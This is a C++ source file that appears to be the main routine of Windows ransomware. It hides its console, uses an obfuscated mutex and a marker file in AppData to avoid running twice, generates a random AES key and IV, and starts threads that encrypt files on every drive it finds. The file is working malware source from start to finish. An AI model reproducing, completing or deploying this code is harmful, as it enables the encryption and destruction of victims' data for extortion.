#include <iostream>
#include <thread>
#include <iomanip>
#include <fstream>

#include <cryptopp/aes.h>
#include <cryptopp/osrng.h>


#include "headers.h"
#include "systeme.h"
#include "diskEncryptor.h"


int main(void) {
	::ShowWindow(::GetConsoleWindow(), DEBUG);

	HANDLE hMutex = CreateMutexA(NULL, TRUE, AY_OBFUSCATE("b29wc2llIHRoYXRzIHNhZCBmb3IgeW91IF5e"));
	if (ERROR_ALREADY_EXISTS == GetLastError()) {
		return 1;
	}

	Systeme sys;
	std::string username = sys.getUsername();
	std::string path = ("C:\\Users\\") + username + "\\AppData\\Roaming\\check.U3AZqJX";
	std::ifstream hasAlready(path);
	if (hasAlready.is_open()) {
		hasAlready.close();
		return 1;
	}
	std::ofstream checkFile(path);
	if (!checkFile.is_open()) {
		return 1;
	}
	checkFile << CHECK_KEY;
	checkFile.close();

	CryptoPP::AutoSeededRandomPool prng;
	CryptoPP::SecByteBlock  key(CryptoPP::AES::DEFAULT_KEYLENGTH);
	CryptoPP::SecByteBlock  iv(CryptoPP::AES::BLOCKSIZE);

	prng.GenerateBlock(key.data(), key.size());
	prng.GenerateBlock(iv.data(), iv.size());


	std::vector<std::thread> threads;
	std::vector<DiskEncryptor> toEncrypt;
	
	std::vector<std::string> drives = sys.getDrives();

	for (auto& drive : drives) {
		DiskEncryptor diskEncryptor(drive, key, iv);
		toEncrypt.push_back(diskEncryptor);
	}
	for (auto& disk : toEncrypt) {
		threads.push_back(std::thread(&DiskEncryptor::iterateFiles, &disk));
	}
	for (std::thread& t : threads) {
		t.join();
	}
	
	return 0;
}